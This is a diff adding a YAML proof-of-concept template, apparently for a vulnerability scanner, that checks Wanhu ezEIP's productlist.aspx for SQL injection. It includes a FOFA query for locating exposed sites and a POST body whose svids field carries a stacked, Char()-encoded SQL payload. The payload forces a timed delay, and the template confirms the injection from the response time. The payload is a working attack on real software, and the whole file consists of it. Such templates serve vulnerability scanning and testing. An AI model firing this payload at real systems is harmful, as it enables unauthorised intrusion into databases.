@@ -1,0 +1,19 @@
+id: poc-yaml-whir-ezeip-productlist-aspx-sqli
+info:
+  name: 万户 ezEIP productlist.aspx SQL注入漏洞
+  severity: high
+  tags:
+  - sql-injection
+  finger: 万户ezEIP
+  fofa: app="万户网络-ezEIP"
+variables:
+  t1: random_int(53,57)
+requests:
+- method: POST
+  path: /shop/productlist.aspx
+  headers:
+    Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+  data: ob=price&price=asc&svids=-1%29%3BDECLARE+%40%40proc_name+VARCHAR%28301%29%3BSet+%40%40proc_name%3DChar%28115%29%252bChar%28101%29%252bChar%28108%29%252bChar%28101%29%252bChar%2899%29%252bChar%28116%29%252bChar%2832%29%252bChar%2849%29%252bChar%2832%29%252bChar%28119%29%252bChar%28104%29%252bChar%28101%29%252bChar%28114%29%252bChar%28101%29%252bChar%2832%29%252bChar%2849%29%252bChar%2861%29%252bChar%2849%29%252bChar%2832%29%252bChar%2887%29%252bChar%2865%29%252bChar%2873%29%252bChar%2884%29%252bChar%2870%29%252bChar%2879%29%252bChar%2882%29%252bChar%2832%29%252bChar%2868%29%252bChar%2869%29%252bChar%2876%29%252bChar%2865%29%252bChar%2889%29%252bChar%2832%29%252bChar%2839%29%252bChar%2848%29%252bChar%2858%29%252bChar%2848%29%252bChar%2858%29%252bChar%28{{.t1}}%29%252bChar%2839%29%3BEXECUTE+%28%40%40proc_name%29%3B--a%2B
+  expression: status_code == 200 && contains(body,"万户网络设计制作") && duration >= 5 &&
+    duration <= 9
+transport: http
